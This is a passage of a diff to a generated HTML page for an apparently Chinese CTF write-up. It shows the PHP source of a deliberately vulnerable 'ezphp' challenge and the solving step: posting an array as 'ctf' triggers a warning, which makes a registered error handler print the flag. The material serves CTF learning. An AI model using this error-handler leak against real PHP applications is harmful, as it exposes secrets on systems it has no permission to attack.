+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_4">漏洞原理</a></h4>
 <p><strong>① 错误处理器会把“错误”变成“输出”</strong></p>
@@ -3675,25 +3878,25 @@
 <hr />
 <details class="note">
 <summary>完整源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="p">}</span>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="p">}</span>
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="p">);</span>
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="p">}</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>    <span class="p">}</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="p">);</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
